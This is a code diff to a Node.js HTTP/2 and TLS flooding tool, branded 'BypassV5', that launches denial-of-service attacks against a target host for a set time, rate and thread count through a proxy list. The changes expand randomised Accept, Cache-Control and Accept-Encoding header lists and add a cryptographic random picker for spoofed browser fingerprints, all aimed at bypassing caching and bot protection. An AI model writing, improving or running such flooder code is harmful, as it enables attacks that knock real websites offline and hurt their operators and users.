@@ -1,4 +1,5 @@
 const net = require("net");
+const axios = require('axios')
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
@@ -15,25 +16,44 @@ const ciphers = "GREASE:" + [
     ...defaultCiphers.slice(3)
 ].join(":");
 const accept_header = [
-    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-  ],
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+    "application/json, text/plain, */*",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/pdf;q=0.9",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xhtml+xml;q=0.9",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/x-apple-plist+xml;q=0.9",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,image/svg+xml;q=0.9",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/x-www-form-urlencoded;q=0.9",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/javascript;q=0.9",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ecmascript;q=0.9"
+],
 
   cache_header = [
-    'max-age=0',
-    'no-cache',
-    'no-store',
-    'pre-check=0',
-    'post-check=0',
-    'must-revalidate',
-    'proxy-revalidate',
-    's-maxage=604800',
-    'no-cache, no-store,private, max-age=0, must-revalidate',
-    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
-    'no-cache, no-store,private, max-age=604800, must-revalidate',
+    'max-age=0, no-cache, no-store, must-revalidate, proxy-revalidate, s-maxage=0, private',
+    'no-cache, no-store, must-revalidate, max-age=0, private, s-maxage=0',
+    'no-cache, no-store, pre-check=0, post-check=0, must-revalidate, proxy-revalidate, s-maxage=0',
+    'no-cache, no-store, private, max-age=0, must-revalidate, proxy-revalidate, stale-while-revalidate=0',
+    'no-cache, no-store, private, s-maxage=0, max-age=0, must-revalidate, stale-if-error=0',
+    'no-cache, no-store, private, max-age=0, s-maxage=0, must-revalidate, proxy-revalidate',
+    'no-cache, no-store, private, max-age=0, s-maxage=0, must-revalidate, proxy-revalidate, stale-while-revalidate=0, stale-if-error=0',
+    'no-cache, no-store, private, max-age=0, s-maxage=0, must-revalidate, proxy-revalidate, pre-check=0, post-check=0',
+    'no-cache, no-store, must-revalidate, max-age=0, s-maxage=0, stale-while-revalidate=0, stale-if-error=0, proxy-revalidate',
+    'private, no-cache, no-store, must-revalidate, proxy-revalidate, max-age=0, s-maxage=0, immutable',
+    'no-cache, no-store, must-revalidate, max-age=0, private, proxy-revalidate, must-understand',
+    'no-cache, no-store, must-revalidate, max-age=0, s-maxage=0, stale-while-revalidate=0, stale-if-error=0, pre-check=0, post-check=0'
   ]
 language_header = [
     'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
@@ -188,7 +208,12 @@ const secureOptions =
  crypto.constants.SSL_OP_SINGLE_DH_USE |
  crypto.constants.SSL_OP_SINGLE_ECDH_USE |
  crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
- if (process.argv.length < 7){console.log(`Usage: host time req thread proxy.txt`); process.exit();}
+ const gradient = require('gradient-string');
+
+ if (process.argv.length < 7) {
+     console.log(gradient.vice('Usage: host time req thread live.txt'));
+     process.exit();
+ }
  const secureProtocol = "TLS_method";
  const headers = {};
 
@@ -216,18 +241,20 @@ const RESTART_DELAY = 1000;
 
  if (cluster.isMaster) {
   console.clear()
-  console.log(`TLS-FLOODER | ATTACK SENT`.rainbow)
-  console.log(`Target: `.brightWhite + process.argv[2])
-  console.log(`Time: `.brightWhite + process.argv[3])
-  console.log(`Rate: `.brightWhite + process.argv[4])
-  console.log(`Thread: `.brightWhite + process.argv[5])
-  console.log(`ProxyFile: `.brightWhite + process.argv[6])
+  console.log(`Attack Successfully Sent`.brightBlue)
+  console.log(`--------------------------------------------`.gray)
+  console.log(` - Target    ◉ `.brightYellow + process.argv[2])
+  console.log(` - Time      ◉ `.brightYellow + process.argv[3])
+  console.log(` - Rate      ◉ `.brightYellow + process.argv[4])
+  console.log(` - Thread    ◉ `.brightYellow + process.argv[5])
+  console.log(` - Owen      : `.brightYellow + "Ngzz Dat")
+  console.log(`--------------------------------------------`.gray)
+  console.log(`BypassV5 By @Ngzz Dat`.brightCyan)
     const restartScript = () => {
         for (const id in cluster.workers) {
             cluster.workers[id].kill();
         }
 
-        console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
         setTimeout(() => {
             for (let counter = 1; counter <= args.threads; counter++) {
                 cluster.fork();
@@ -241,7 +268,7 @@ const RESTART_DELAY = 1000;
         const ramPercentage = (usedRAM / totalRAM) * 100;
 
         if (ramPercentage >= MAX_RAM_PERCENTAGE) {
-            console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
+           ramPercentage.toFixed(2);
             restartScript();
         }
     };
@@ -427,13 +454,28 @@ const randstrsValue = randstrs(10);
       "Razzle",
       "HPC 2008",
       ];
-      
-       var nm1 = nm[Math.floor(Math.floor(Math.random() * nm.length))];
-       var nm2 = sysos[Math.floor(Math.floor(Math.random() * sysos.length))];
-       var nm3 = winarch[Math.floor(Math.floor(Math.random() * winarch.length))];
-       var nm4 = nmx[Math.floor(Math.floor(Math.random() * nmx.length))];
-       var nm5 = winch[Math.floor(Math.floor(Math.random() * winch.length))];
-       var nm6 = nmx1[Math.floor(Math.floor(Math.random() * nmx1.length))];
+
+       function superUltraMegaStrongRandom(max) {
+            let seed1 = crypto.randomBytes(32).toString('hex'); // 32 byte entropy cực mạnh
+            let seed2 = crypto.randomBytes(32).toString('hex');
+
+            let combinedSeed = seed1 + seed2;
+
+            let hash1 = crypto.createHash('sha512').update(combinedSeed).digest('hex');
+            let hash2 = crypto.createHash('sha512').update(hash1).digest('hex');
+            let hash3 = crypto.createHash('sha512').update(hash2).digest('hex');
+
+            let finalSeed = BigInt("0x" + hash3.slice(0, 32)); // Chuyển sang BigInt để đảm bảo max range
+
+            return Number(finalSeed % BigInt(max)); // Chuyển về số thường, đảm bảo trong phạm vi max
+       }
+
+       var nm1 = nm[superUltraMegaStrongRandom(nm.length)];
+       var nm2 = sysos[superUltraMegaStrongRandom(sysos.length)];
+       var nm3 = winarch[superUltraMegaStrongRandom(winarch.length)];
+       var nm4 = nmx[superUltraMegaStrongRandom(nmx.length)];
+       var nm5 = winch[superUltraMegaStrongRandom(winch.length)];
+       var nm6 = nmx1[superUltraMegaStrongRandom(nmx1.length)];
         const rd = [
           "221988",
           "1287172",
@@ -443,13 +485,24 @@ const randstrsValue = randstrs(10);
           "63535464",
           "121212",
         ];
-         var kha = rd[Math.floor(Math.floor(Math.random() * rd.length))];
-         
+        var kha = rd[Math.floor(Math.floor(Math.random() * rd.length))];
   encoding_header = [
-    'gzip, deflate, br'
-    , 'compress, gzip'
-    , 'deflate, gzip'
+    'gzip, deflate, br', 
+    'deflate, gzip', 
+    'gzip, identity', 
+    'gzip, compress, br', 
+    'identity, gzip, deflate', 
+    'gzip, deflate, zstd', 
+    'br, zstd, gzip', 
+    'gzip, deflate, br, lzma', 
+    'deflate, br, zstd, xpress', 
+    'gzip, deflate, xz', 
+    'gzip, zstd, snappy', 
+    'identity, *;q=0', 
     , 'gzip, identity'
+    , 'deflate, gzip'
+    , 'compress, gzip', 
+    '*',
   ];
   function randstrr(length) {
 		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
